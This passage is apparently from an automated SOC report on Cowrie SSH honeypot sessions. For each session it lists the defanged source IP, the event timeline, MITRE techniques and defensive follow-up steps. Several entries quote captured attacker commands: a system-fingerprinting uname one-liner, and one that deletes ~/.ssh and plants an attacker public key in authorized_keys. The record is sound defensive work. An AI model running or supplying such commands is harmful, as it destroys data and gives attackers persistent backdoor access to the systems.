**Recommended Actions:**
- [ ] Submit `186.195.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `186.195.170[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c3e057734d0

| Field | Detail |
|---|---|
| **Source IP** | `186.195.170[.]10` |
| **First Seen** | 2026-07-08 21:34 |
| **Last Seen** | 2026-07-08 21:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:34:17` | `cowrie.session.connect` |
| `2026-07-08 21:34:17` | `cowrie.client.version` |
| `2026-07-08 21:34:17` | `cowrie.client.kex` |
| `2026-07-08 21:34:18` | `cowrie.login.success` |
| `2026-07-08 21:34:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.195.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `186.195.170[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8c4321674d8

| Field | Detail |
|---|---|
| **Source IP** | `58.22.255[.]28` |
| **First Seen** | 2026-07-08 21:34 |
| **Last Seen** | 2026-07-08 21:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:34:45` | `cowrie.session.connect` |
| `2026-07-08 21:34:46` | `cowrie.client.version` |
| `2026-07-08 21:34:46` | `cowrie.client.kex` |
| `2026-07-08 21:34:48` | `cowrie.login.success` |
| `2026-07-08 21:34:49` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:34:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.22.255[.]28` to AbuseIPDB if not already reported
- [ ] Block `58.22.255[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d441eddfdeaa

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]38` |
| **First Seen** | 2026-07-08 21:35 |
| **Last Seen** | 2026-07-08 21:35 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:35:33` | `cowrie.session.connect` |
| `2026-07-08 21:35:33` | `cowrie.client.version` |
| `2026-07-08 21:35:33` | `cowrie.client.kex` |
| `2026-07-08 21:35:34` | `cowrie.login.success` |
| `2026-07-08 21:35:34` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:35:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-08 21:35:34` | `cowrie.direct-tcpip.data` |
| `2026-07-08 21:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]38` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ec7311d0f93

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]38` |
| **First Seen** | 2026-07-08 21:35 |
| **Last Seen** | 2026-07-08 21:36 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:35:52` | `cowrie.session.connect` |
| `2026-07-08 21:35:52` | `cowrie.client.version` |
| `2026-07-08 21:35:52` | `cowrie.client.kex` |
| `2026-07-08 21:35:52` | `cowrie.login.success` |
| `2026-07-08 21:35:53` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:35:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-08 21:35:53` | `cowrie.direct-tcpip.data` |
| `2026-07-08 21:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]38` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2c8765b1a24

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]38` |
| **First Seen** | 2026-07-08 21:36 |
| **Last Seen** | 2026-07-08 21:36 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:36:07` | `cowrie.session.connect` |
| `2026-07-08 21:36:07` | `cowrie.client.version` |
| `2026-07-08 21:36:07` | `cowrie.client.kex` |
| `2026-07-08 21:36:07` | `cowrie.login.success` |
| `2026-07-08 21:36:07` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:36:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-08 21:36:07` | `cowrie.direct-tcpip.data` |
| `2026-07-08 21:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]38` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cec296462cd4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:36 |
| **Last Seen** | 2026-07-08 21:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:36:10` | `cowrie.session.connect` |
| `2026-07-08 21:36:11` | `cowrie.client.version` |
| `2026-07-08 21:36:11` | `cowrie.client.kex` |
| `2026-07-08 21:36:12` | `cowrie.login.success` |
| `2026-07-08 21:36:14` | `cowrie.session.params` |
| `2026-07-08 21:36:14` | `cowrie.command.input` |
| `2026-07-08 21:36:14` | `cowrie.command.input` |
| `2026-07-08 21:36:14` | `cowrie.command.input` |
| `2026-07-08 21:36:14` | `cowrie.command.input` |
| `2026-07-08 21:36:14` | `cowrie.command.input` |
| `2026-07-08 21:36:14` | `cowrie.command.success` |
| `2026-07-08 21:36:14` | `cowrie.command.input` |
| `2026-07-08 21:36:14` | `cowrie.command.input` |
| `2026-07-08 21:36:14` | `cowrie.command.input` |
| `2026-07-08 21:36:14` | `cowrie.command.input` |
| `2026-07-08 21:36:14` | `cowrie.log.closed` |
| `2026-07-08 21:36:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddecd4c84942

| Field | Detail |
|---|---|
| **Source IP** | `157.245.34[.]56` |
| **First Seen** | 2026-07-08 21:37 |
| **Last Seen** | 2026-07-08 21:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:37:12` | `cowrie.session.connect` |
| `2026-07-08 21:37:12` | `cowrie.client.version` |
| `2026-07-08 21:37:12` | `cowrie.client.kex` |
| `2026-07-08 21:37:12` | `cowrie.login.success` |
| `2026-07-08 21:37:13` | `cowrie.session.params` |
| `2026-07-08 21:37:13` | `cowrie.command.input` |
| `2026-07-08 21:37:13` | `cowrie.command.failed` |
| `2026-07-08 21:37:13` | `cowrie.log.closed` |
| `2026-07-08 21:37:14` | `cowrie.session.params` |
| `2026-07-08 21:37:14` | `cowrie.command.input` |
| `2026-07-08 21:37:14` | `cowrie.session.file_download` |
| `2026-07-08 21:37:14` | `cowrie.log.closed` |
| `2026-07-08 21:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.34[.]56` to AbuseIPDB if not already reported
- [ ] Block `157.245.34[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9df046ab232a

| Field | Detail |
|---|---|
| **Source IP** | `157.245.34[.]56` |
| **First Seen** | 2026-07-08 21:37 |
| **Last Seen** | 2026-07-08 21:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:37:14` | `cowrie.session.connect` |
| `2026-07-08 21:37:14` | `cowrie.client.version` |
| `2026-07-08 21:37:14` | `cowrie.client.kex` |
| `2026-07-08 21:37:14` | `cowrie.login.success` |
| `2026-07-08 21:37:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.34[.]56` to AbuseIPDB if not already reported
- [ ] Block `157.245.34[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b84e4ab1455

| Field | Detail |
|---|---|
| **Source IP** | `157.245.34[.]56` |
| **First Seen** | 2026-07-08 21:37 |
| **Last Seen** | 2026-07-08 21:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:37:14` | `cowrie.session.connect` |
| `2026-07-08 21:37:14` | `cowrie.client.version` |
| `2026-07-08 21:37:14` | `cowrie.client.kex` |
| `2026-07-08 21:37:15` | `cowrie.login.success` |
| `2026-07-08 21:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.34[.]56` to AbuseIPDB if not already reported
- [ ] Block `157.245.34[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2afbb78c2ec9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:38 |
| **Last Seen** | 2026-07-08 21:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:38:23` | `cowrie.session.connect` |
| `2026-07-08 21:38:23` | `cowrie.client.version` |
| `2026-07-08 21:38:23` | `cowrie.client.kex` |
| `2026-07-08 21:38:25` | `cowrie.login.success` |
| `2026-07-08 21:38:26` | `cowrie.session.params` |
| `2026-07-08 21:38:26` | `cowrie.command.input` |
| `2026-07-08 21:38:26` | `cowrie.command.input` |
| `2026-07-08 21:38:26` | `cowrie.command.input` |
| `2026-07-08 21:38:26` | `cowrie.command.input` |
| `2026-07-08 21:38:26` | `cowrie.command.input` |
| `2026-07-08 21:38:26` | `cowrie.command.success` |
| `2026-07-08 21:38:26` | `cowrie.command.input` |
| `2026-07-08 21:38:26` | `cowrie.command.input` |
| `2026-07-08 21:38:26` | `cowrie.command.input` |
| `2026-07-08 21:38:26` | `cowrie.command.input` |
| `2026-07-08 21:38:27` | `cowrie.log.closed` |
| `2026-07-08 21:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-969c090863cf

| Field | Detail |
|---|---|
| **Source IP** | `62.201.212[.]54` |
| **First Seen** | 2026-07-08 21:38 |
| **Last Seen** | 2026-07-08 21:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:38:23` | `cowrie.session.connect` |
| `2026-07-08 21:38:24` | `cowrie.client.version` |
| `2026-07-08 21:38:24` | `cowrie.client.kex` |
| `2026-07-08 21:38:25` | `cowrie.login.success` |
| `2026-07-08 21:38:26` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:38:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.212[.]54` to AbuseIPDB if not already reported
- [ ] Block `62.201.212[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ad04fd105d1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 21:39 |
| **Last Seen** | 2026-07-08 21:39 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:39:42` | `cowrie.session.connect` |
| `2026-07-08 21:39:43` | `cowrie.client.version` |
| `2026-07-08 21:39:43` | `cowrie.client.kex` |
| `2026-07-08 21:39:48` | `cowrie.login.success` |
| `2026-07-08 21:39:52` | `cowrie.session.params` |
| `2026-07-08 21:39:52` | `cowrie.command.input` |
| `2026-07-08 21:39:53` | `cowrie.log.closed` |
| `2026-07-08 21:39:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90d9ce8787a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:40 |
| **Last Seen** | 2026-07-08 21:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:40:38` | `cowrie.session.connect` |
| `2026-07-08 21:40:38` | `cowrie.client.version` |
| `2026-07-08 21:40:38` | `cowrie.client.kex` |
| `2026-07-08 21:40:40` | `cowrie.login.success` |
| `2026-07-08 21:40:41` | `cowrie.session.params` |
| `2026-07-08 21:40:41` | `cowrie.command.input` |
| `2026-07-08 21:40:41` | `cowrie.command.input` |
| `2026-07-08 21:40:41` | `cowrie.command.input` |
| `2026-07-08 21:40:41` | `cowrie.command.input` |
| `2026-07-08 21:40:41` | `cowrie.command.input` |
| `2026-07-08 21:40:41` | `cowrie.command.success` |
| `2026-07-08 21:40:41` | `cowrie.command.input` |
| `2026-07-08 21:40:41` | `cowrie.command.input` |
| `2026-07-08 21:40:41` | `cowrie.command.input` |
| `2026-07-08 21:40:41` | `cowrie.command.input` |
| `2026-07-08 21:40:42` | `cowrie.log.closed` |
| `2026-07-08 21:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55461094e83c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:42 |
| **Last Seen** | 2026-07-08 21:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:42:56` | `cowrie.session.connect` |
| `2026-07-08 21:42:56` | `cowrie.client.version` |
| `2026-07-08 21:42:56` | `cowrie.client.kex` |
| `2026-07-08 21:42:57` | `cowrie.login.success` |
| `2026-07-08 21:42:59` | `cowrie.session.params` |
| `2026-07-08 21:42:59` | `cowrie.command.input` |
| `2026-07-08 21:42:59` | `cowrie.command.input` |
| `2026-07-08 21:42:59` | `cowrie.command.input` |
| `2026-07-08 21:42:59` | `cowrie.command.input` |
| `2026-07-08 21:42:59` | `cowrie.command.input` |
| `2026-07-08 21:42:59` | `cowrie.command.success` |
| `2026-07-08 21:42:59` | `cowrie.command.input` |
| `2026-07-08 21:42:59` | `cowrie.command.input` |
| `2026-07-08 21:42:59` | `cowrie.command.input` |
| `2026-07-08 21:42:59` | `cowrie.command.input` |
| `2026-07-08 21:42:59` | `cowrie.log.closed` |
| `2026-07-08 21:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b345e6337d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:45 |
| **Last Seen** | 2026-07-08 21:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:45:08` | `cowrie.session.connect` |
| `2026-07-08 21:45:08` | `cowrie.client.version` |
| `2026-07-08 21:45:09` | `cowrie.client.kex` |
| `2026-07-08 21:45:10` | `cowrie.login.success` |
| `2026-07-08 21:45:11` | `cowrie.session.params` |
| `2026-07-08 21:45:11` | `cowrie.command.input` |
| `2026-07-08 21:45:11` | `cowrie.command.input` |
| `2026-07-08 21:45:11` | `cowrie.command.input` |
| `2026-07-08 21:45:11` | `cowrie.command.input` |
| `2026-07-08 21:45:11` | `cowrie.command.input` |
| `2026-07-08 21:45:11` | `cowrie.command.success` |
| `2026-07-08 21:45:11` | `cowrie.command.input` |
| `2026-07-08 21:45:11` | `cowrie.command.input` |
| `2026-07-08 21:45:11` | `cowrie.command.input` |
| `2026-07-08 21:45:11` | `cowrie.command.input` |
| `2026-07-08 21:45:11` | `cowrie.log.closed` |
| `2026-07-08 21:45:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-591d34abbde0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:47 |
| **Last Seen** | 2026-07-08 21:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:47:24` | `cowrie.session.connect` |
| `2026-07-08 21:47:24` | `cowrie.client.version` |
| `2026-07-08 21:47:24` | `cowrie.client.kex` |
| `2026-07-08 21:47:25` | `cowrie.login.success` |
| `2026-07-08 21:47:27` | `cowrie.session.params` |
| `2026-07-08 21:47:27` | `cowrie.command.input` |
| `2026-07-08 21:47:27` | `cowrie.command.input` |
| `2026-07-08 21:47:27` | `cowrie.command.input` |
| `2026-07-08 21:47:27` | `cowrie.command.input` |
| `2026-07-08 21:47:27` | `cowrie.command.input` |
| `2026-07-08 21:47:27` | `cowrie.command.success` |
| `2026-07-08 21:47:27` | `cowrie.command.input` |
| `2026-07-08 21:47:27` | `cowrie.command.input` |
| `2026-07-08 21:47:27` | `cowrie.command.input` |
| `2026-07-08 21:47:27` | `cowrie.command.input` |
| `2026-07-08 21:47:27` | `cowrie.log.closed` |
| `2026-07-08 21:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25244d9ace7c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 21:47 |
| **Last Seen** | 2026-07-08 21:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:47:29` | `cowrie.session.connect` |
| `2026-07-08 21:47:30` | `cowrie.client.version` |
| `2026-07-08 21:47:30` | `cowrie.client.kex` |
| `2026-07-08 21:47:34` | `cowrie.login.success` |
| `2026-07-08 21:47:37` | `cowrie.session.params` |
| `2026-07-08 21:47:37` | `cowrie.command.input` |
| `2026-07-08 21:47:38` | `cowrie.log.closed` |
| `2026-07-08 21:47:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49d056ac2a5b

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-08 21:49 |
| **Last Seen** | 2026-07-08 21:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:49:26` | `cowrie.session.connect` |
| `2026-07-08 21:49:26` | `cowrie.client.version` |
| `2026-07-08 21:49:26` | `cowrie.client.kex` |
| `2026-07-08 21:49:27` | `cowrie.login.success` |
| `2026-07-08 21:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70162f30b808

| Field | Detail |
|---|---|
